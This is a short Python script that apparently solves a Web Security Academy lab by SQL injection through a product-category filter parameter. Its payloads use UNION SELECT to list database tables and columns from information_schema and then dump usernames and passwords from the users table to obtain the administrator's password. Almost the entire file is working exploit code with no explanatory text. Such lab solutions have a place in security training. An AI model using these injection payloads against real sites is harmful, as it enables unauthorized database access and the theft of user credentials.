import requests

site = "ac241ffc1e86c011c2ef88cb006e0061.web-security-academy.net"

if __name__ == "__main__":
    def try_category(category_string):
        url = f'https://{site}/filter?category={category_string}'
        resp = s.get(url)
        print(resp.text)


    s = requests.Session()
    # try_category("""Gifts' UNION SELECT table_name,null from information_schema.tables-- """)
    # Found user table: users_ypnxvs

    # try_category("""Gifts' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users_ypnxvs'--""")
    # Finding columns: <th>password_jlrlpp</th> & <th>username_uupftb</th>

    # Now, to get admin password, run this and fine the table row for administrator
    try_category("""Gifts' UNION SELECT username_uupftb,password_jlrlpp FROM users_ypnxvs--""")
